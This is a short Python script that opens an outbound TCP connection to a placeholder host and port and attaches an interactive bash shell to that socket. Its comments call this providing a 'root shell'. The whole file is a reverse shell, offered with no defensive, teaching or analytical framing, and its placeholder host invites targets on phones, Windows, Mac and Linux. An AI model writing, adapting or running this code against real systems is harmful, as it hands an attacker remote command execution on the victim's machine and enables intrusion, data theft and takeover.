import socket
import subprocess
import os

# Remote client details
REMOTE_HOST = "PHONE , WINDOWS, MAC, LINUX -> IP"  # Change to the client's IP or hostname
REMOTE_PORT = 43437  # Change to the client's listening port

def main():
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.connect((REMOTE_HOST, REMOTE_PORT))
        print("Connected to the client.")

        # Provide a root shell to the client
        provide_root_shell(server_socket)
    except Exception as e:
        print(f"Error connecting to the client: {str(e)}")

def provide_root_shell(server_socket):
    try:
        # Run a root shell and redirect stdin, stdout, and stderr to the client socket
        subprocess.Popen(["/bin/bash", "-i"], stdin=server_socket, stdout=server_socket, stderr=server_socket)
    except Exception as e:
        print(f"Error providing root shell: {str(e)}")

if __name__ == "__main__":
    main()
